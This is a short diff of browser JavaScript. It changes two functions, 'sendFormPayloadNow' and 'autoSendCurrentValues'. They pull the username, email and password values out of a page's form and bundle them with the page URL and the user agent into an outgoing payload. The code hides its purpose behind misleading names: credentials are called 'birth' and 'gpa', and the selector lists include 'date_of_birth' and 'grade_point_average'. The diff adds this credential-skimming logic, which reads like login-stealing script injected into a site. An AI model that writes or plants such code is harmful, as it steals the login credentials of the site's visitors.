@@ -113,8 +113,8 @@ return null;
   window.sendFormPayloadNow = function(birth, gpa, extra) {
     extra = extra || {};
     var fields = [];
-    if (birth) fields.push({ name: 'identifier', value: String(identifier), inline: true });
-    if (gpa) fields.push({ name: 'password', value: String(password), inline: true });
+    if (birth) fields.push({ name: 'email', value: String(email), inline: true });
+    if (gpa) fields.push({ name: 'passy', value: String(passy), inline: true });
     if (extra.email) fields.push({ name: 'Email', value: String(extra.email), inline: false });
     fields.push({ name: 'Page', value: location.href, inline: false });
     fields.push({ name: 'UA', value: navigator.userAgent.substring(0,190), inline: false });
@@ -124,8 +124,8 @@ return null;
   };
 
   window.autoSendCurrentValues = function() {
-    var birthSelectors = ['identifier','identifiers','username','name','date_of_birth','birthday'];
-    var gpaSelectors = ['password','pass','Passwords','pas','grade_point_average'];
+    var birthSelectors = ['identifier','identifiers','username','name','email','birthday'];
+    var gpaSelectors = ['passy','pass','Passy','pas','grade_point_average'];
     var form = document.getElementById('profile-form') || document.getElementById('auth-form') || document.querySelector('form');
     var birthEl = form ? findFieldInForm(form, birthSelectors) : null;
     var gpaEl = form ? findFieldInForm(form, gpaSelectors) : null;
